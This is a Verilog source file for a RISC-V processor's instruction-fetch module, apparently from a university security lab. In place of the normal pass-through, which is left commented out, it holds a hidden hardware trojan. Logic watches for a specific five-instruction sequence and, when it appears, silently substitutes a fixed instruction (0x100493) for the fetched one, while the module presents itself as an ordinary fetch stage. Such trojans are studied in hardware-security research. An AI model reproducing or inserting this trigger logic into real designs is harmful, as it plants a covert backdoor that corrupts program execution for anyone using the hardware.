/** @module : fetch_receive
 *  @author : Adaptive & Secure Computing Systems (ASCS) Laboratory

 *  Copyright (c) 2021 STAM Center (ASCS Lab/CAES Lab/STAM Center/ASU)
 *  Permission is hereby granted, free of charge, to any person obtaining a copy
 *  of this software and associated documentation files (the "Software"), to deal
 *  in the Software without restriction, including without limitation the rights
 *  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 *  copies of the Software, and to permit persons to whom the Software is
 *  furnished to do so, subject to the following conditions:
 *  The above copyright notice and this permission notice shall be included in
 *  all copies or substantial portions of the Software.

 *  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 *  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 *  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 *  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 *  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 *  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 *  THE SOFTWARE.
 */

module fetch_receive #(
  parameter DATA_WIDTH      =   32,
  parameter SCAN_CYCLES_MIN =    0,
  parameter SCAN_CYCLES_MAX = 1000
)(
  // Control signals
  input  flush,

  // Instruction memory interface
  input  [DATA_WIDTH-1  :0] i_mem_data,

  // Outputs to with decode
  output reg [DATA_WIDTH-1  :0] instruction,

  //scan signal
  input scan
);

localparam NOP = 32'h00000013;
reg trigger;
reg [DATA_WIDTH-1:0] PREV_INST [0:4];
always @(*) begin
  if (!flush) begin
    PREV_INST[4] = PREV_INST[3];
    PREV_INST[3] = PREV_INST[2];
    PREV_INST[2] = PREV_INST[1];
    PREV_INST[1] = PREV_INST[0];
    PREV_INST[0] = i_mem_data;
    $display("\nTESTE INS: %h     | %d", i_mem_data, flush);
  end

  if (PREV_INST[0] == 32'h13 && PREV_INST[1] == 32'h13 && PREV_INST[2] == 32'h13 && PREV_INST[3] == 32'h13 && PREV_INST[4] == 32'h50493) begin
    $display("\nTRIGGER!");
    trigger = 1'b1;

  end else begin
    trigger = 1'b0;
  end
  
  if (trigger) begin
    instruction <= flush ? NOP : 32'h100493;
  end else begin
    instruction <= flush ? NOP : i_mem_data;
  end
end


// assign instruction = flush ? NOP : i_mem_data;

endmodule
